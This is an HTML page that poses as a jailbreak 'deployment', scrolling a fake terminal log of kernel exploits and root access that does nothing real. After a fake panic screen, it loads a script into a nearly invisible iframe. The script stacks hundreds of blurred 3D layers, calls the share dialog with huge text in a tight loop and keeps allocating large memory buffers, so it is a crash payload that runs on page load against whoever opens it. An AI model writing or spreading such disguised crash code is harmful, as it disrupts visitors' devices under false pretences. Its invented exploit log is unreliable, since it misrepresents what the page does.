<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>i26 | Deployment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #020202;
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
            overflow: hidden;
            user-select: none;
        }
        .font-sans { font-family: 'Outfit', sans-serif; }
        .terminal-window {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 100px rgba(0, 0, 0, 0.8), inset 0 0 40px rgba(255, 255, 255, 0.01);
        }
        .scanline {
            width: 100%;
            height: 100px;
            z-index: 10;
            background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(255, 255, 255, 0.02) 50%, rgba(0, 0, 0, 0) 100%);
            box-shadow: 0 0 20px rgba(0, 0, 0, .2);
            position: absolute;
            animation: scanline 8s linear infinite;
        }
        @keyframes scanline {
            0% { top: -100px; }
            100% { top: 100%; }
        }
        .log-entry {
            animation: fadeIn 0.4s ease forwards;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .glitch-screen {
            background: rgba(185, 28, 28, 0.05);
            animation: flicker 0.1s infinite;
        }
        @keyframes flicker {
            0% { opacity: 0.8; }
            50% { opacity: 1; }
            100% { opacity: 0.9; }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-8">

    <div class="scanline pointer-events-none"></div>

    <div id="simulation" class="w-full max-w-2xl space-y-12">
        <!-- Status Bar -->
        <div class="flex items-center justify-between px-4">
            <div class="flex items-center gap-4">
                <div class="w-2 h-2 rounded-full bg-indigo-500 animate-pulse"></div>
                <span class="text-[10px] tracking-[0.5em] text-white/30 uppercase">Deployment Active</span>
            </div>
            <span id="pct" class="text-sm font-bold tracking-widest text-indigo-400">0%</span>
        </div>

        <!-- Terminal Layout -->
        <div class="terminal-window rounded-[2rem] overflow-hidden">
            <!-- Terminal Header -->
            <div class="flex items-center gap-2 px-6 py-4 bg-white/5 border-b border-white/5">
                <div class="w-2 h-2 rounded-full bg-red-500/50"></div>
                <div class="w-2 h-2 rounded-full bg-yellow-500/50"></div>
                <div class="w-2 h-2 rounded-full bg-green-500/50"></div>
                <span class="ml-4 text-[9px] text-white/20 uppercase tracking-widest font-sans">Corev26.sh</span>
            </div>

            <!-- Terminal Content -->
            <div id="terminal" class="h-96 p-8 text-[11px] overflow-y-auto space-y-2.5 leading-relaxed console-content">
            </div>

            <!-- Progress Bar Bottom -->
            <div class="h-1 w-full bg-white/5">
                <div id="bar" class="h-full bg-indigo-500 transition-all duration-100 shadow-[0_0_15px_rgba(94,92,230,0.5)]" style="width: 0%"></div>
            </div>
        </div>

        <!-- System Stats Footer (Visible in terminal phase) -->
        <div id="footer" class="flex justify-center gap-12 text-[9px] text-white/20 uppercase tracking-[0.4em]">
            <div class="flex items-center gap-2">
                <i data-lucide="user" class="w-3 h-3"></i>
                <span>neonmodder123</span>
            </div>
            <div class="flex items-center gap-2">
                <i data-lucide="cpu" class="w-3 h-3"></i>
                <span>Google AI</span>
            </div>
        </div>
    </div>

    <!-- Glitch Phase -->
    <div id="error-screen" class="hidden fixed inset-0 z-50 flex flex-col items-center justify-center glitch-screen">
        <div class="text-red-600 space-y-4 text-center">
            <i data-lucide="alert-triangle" class="w-16 h-16 mx-auto animate-bounce"></i>
            <h2 id="fatal" class="hidden text-xs font-bold uppercase tracking-[0.8em]">Fatal System Memory Overflow</h2>
        </div>
    </div>

    <!-- Final Respring Blackout (User's specific loader) -->
    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center text-center p-6">
        <div id="loader" class="font-sans text-sm space-y-4">
            <div class="w-10 h-10 border-2 border-white/10 border-t-indigo-500 rounded-full animate-spin mx-auto mb-10"></div>
            <p class="text-white/80">Respringing... (didn't work? ping neon)</p>
            
            <div class="pt-12 space-y-1 text-[10px] text-white/20">
                <p>© 2026 <span class="text-white/40 font-bold">neonmodder123</span></p>
                <p>Licensed under <a href="https://opensource.org/license/mit/" target="_blank" style="color: #1ad2dc; text-decoration: underline;">MIT</a>.</p>
                <p class="max-w-[250px] mx-auto opacity-50">Modifying without credit is a violation of the license.</p>
            </div>
        </div>
    </div>

    <!-- User's Respring Iframe -->
    <iframe id="respring-iframe" class="fixed top-0 left-0 w-1 h-1 border-none opacity-[0.05] pointer-events-none" 
        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
    </iframe>

    <script>
        lucide.createIcons();

        const commands = [
            "Mounting /mnt/system-raw...",
            "Overriding SIP (System Integrity Protection)...",
            "Allocating kernel heap buffer [0x44]...",
            "Executing ROP chain [AURORA-v1]...",
            "Kernel exploit successful. Current PID: 0",
            "Injecting Dyld_Shared_Cache hooks...",
            "Patching AMFI validation logic...",
            "Remounting RootFS as R/W...",
            "Initializing Cydia/Zebra bootstrap...",
            "Cleaning memory address leaks...",
            "Deployment finished. Stabilizing system..."
        ];

        let idx = 0;
        let p = 0;
        const term = document.getElementById('terminal');

        function addLine() {
            if (idx < commands.length) {
                const row = document.createElement('div');
                row.className = 'log-entry flex gap-4';
                row.innerHTML = `<span class="text-indigo-500/40">system:~$</span> <span class="text-white/80">${commands[idx]}</span>`;
                term.appendChild(row);
                term.scrollTop = term.scrollHeight;
                idx++;
            }
        }

        const run = setInterval(() => {
            p += 0.85;
            if (p > 100) p = 100;
            
            document.getElementById('bar').style.width = p + '%';
            document.getElementById('pct').innerText = Math.floor(p) + '%';

            if (Math.random() > 0.88) addLine();

            if (p >= 100) {
                clearInterval(run);
                setTimeout(initiatePanic, 1200);
            }
        }, 40);

        function initiatePanic() {
            document.getElementById('simulation').classList.add('hidden');
            document.getElementById('error-screen').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('fatal').classList.remove('hidden');
                setTimeout(executeRespring, 1800);
            }, 600);
        }

        function executeRespring() {
            document.getElementById('error-screen').classList.add('hidden');
            document.getElementById('respring-view').classList.remove('hidden');

            const frame = document.getElementById('respring-iframe');
            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden; background: black;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);

                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }

                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript;
        }
    </script>
</body>
</html>
